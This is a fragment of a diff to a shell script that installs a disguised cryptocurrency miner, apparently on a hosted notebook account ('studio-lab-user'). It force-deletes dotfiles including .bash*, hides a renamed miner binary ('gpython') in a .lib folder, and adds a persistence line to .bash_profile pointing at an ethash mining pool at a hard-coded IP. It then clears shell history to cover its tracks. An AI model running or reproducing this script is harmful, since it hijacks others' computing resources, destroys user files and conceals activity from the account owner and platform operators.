@@ -1,4 +1,5 @@
 #!/bin/sh
+
 cd ~/
 rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
 mkdir .lib
@@ -22,3 +23,4 @@ echo 'POOLNH="3.1.81.175:80"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
 echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
 chmod +x gas.sh && chmod +x gpython && cd ~/ && history -cr && source .bashrc
+
